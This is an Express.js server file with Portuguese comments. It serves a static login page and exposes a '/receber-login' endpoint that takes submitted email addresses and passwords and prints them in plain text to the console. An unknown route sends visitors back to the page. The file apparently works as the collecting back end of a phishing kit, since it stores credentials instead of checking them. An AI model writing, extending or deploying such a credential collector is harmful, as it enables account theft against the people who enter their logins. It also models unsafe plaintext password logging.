const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();

// Configurações
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Rota principal - SERVIR O ARQUIVO HTML
app.get('/', (req, res) => {
    console.log('📄 Servindo página inicial...');
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota de saúde para testar
app.get('/health', (req, res) => {
    console.log('❤️ Health check recebido');
    res.json({ 
        status: 'OK', 
        message: 'Servidor funcionando!',
        timestamp: new Date().toISOString()
    });
});

// Rota para receber logins
app.post('/receber-login', (req, res) => {
    console.log('📨 Recebendo dados de login...');
    
    const { email, senha } = req.body;
    const data = new Date().toLocaleString('pt-BR');
    
    console.log('✅ NOVO LOGIN RECEBIDO:');
    console.log('👤 Email:', email);
    console.log('🔑 Senha:', senha);
    console.log('⏰ Data/Hora:', data);
    console.log('──────────────────────────');
    
    res.json({ 
        success: true, 
        message: 'Login recebido com sucesso!',
        data: data,
        recebido: true
    });
});

// Rota catch-all para evitar "Not Found"
app.get('*', (req, res) => {
    console.log('🔄 Redirecionando para página principal...');
    res.redirect('/');
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
    console.log('='.repeat(50));
    console.log('🚀 SERVIDOR INICIADO COM SUCESSO!');
    console.log(`📍 Porta: ${PORT}`);
    console.log(`🌐 URL: http://0.0.0.0:${PORT}`);
    console.log('='.repeat(50));
    console.log('📊 Rotas disponíveis:');
    console.log('   GET  /          → Página principal');
    console.log('   GET  /health    → Health check');
    console.log('   POST /receber-login → Receber logins');
    console.log('='.repeat(50));
});
